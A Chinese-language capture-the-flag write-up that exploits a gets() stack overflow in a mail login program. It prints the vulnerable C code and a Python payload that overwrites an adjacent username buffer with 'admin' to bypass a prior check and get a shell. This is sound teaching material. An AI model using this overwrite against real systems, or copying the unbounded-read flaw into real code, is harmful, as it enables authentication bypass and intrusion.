# corporate-cliche

## 题目简述

附件是一个简单的邮件系统登录程序。程序先用 `fgets()` 把用户名读入 32 字节缓冲区，并显式拒绝字符串 `admin`；随后却用无长度限制的 `gets()` 读取 32 字节密码。题目所给二进制把 `password` 与 `username` 相邻放在栈上，因此可以从密码缓冲区溢出并改写已通过前置检查的用户名。

## 解题过程

程序先检查用户名，之后才读取密码并遍历账号表：

```c
char password[32];
char username[32];

fgets(username, sizeof(username), stdin);
username[strcspn(username, "\n")] = 0;
if (strcmp(username, "admin") == 0) exit(0);

gets(password);

if (strcmp(username, "admin") == 0 &&
    strcmp(password, "🇦🇩🇲🇮🇳") == 0) {
    open_admin_session();
}
```

初始用户名可填 `guest`，这样既绕过 `admin` 拒绝分支，又能进入密码输入。题目二进制中的栈布局为：

```text
低地址                                         高地址
+--------------------+--------------------+
| password（32 字节） | username（32 字节） |
+--------------------+--------------------+
```

密码比较要求缓冲区开头仍是管理员密码，因此 payload 先写管理员密码及 `\x00`，填满 32 字节后再把相邻用户名覆盖为 `admin\x00`：

```python
admin_password = "🇦🇩🇲🇮🇳".encode("utf-8")

payload = admin_password + b"\x00"
payload += b"A" * (32 - len(payload))
payload += b"admin\x00"
```

两个 NUL 字节都不可省略。`strcmp()` 依靠 NUL 判断字符串结束；缺少第一个会把 padding 当作密码，缺少第二个则可能继续读取用户名后方的栈数据。发送 payload 后，后置账号检查看到的是合法管理员密码和被改写的管理员用户名，于是进入 `open_admin_session()` 并启动 shell，可在服务环境中读取 flag。

## 方法总结

- 核心技巧：利用 `gets()` 的无界写入覆盖相邻局部变量，改变已经通过前置校验的安全状态。
- 识别信号：用户名限制严格而密码使用 `gets()`；敏感决策又在密码输入之后重新读取用户名。
- 复用要点：源码中的局部变量顺序不等于所有编译器下的固定布局，真实偏移应以题目二进制或官方 solver 为准；构造字符串型覆盖时还必须处理终止 NUL 和多字节 UTF-8 长度。
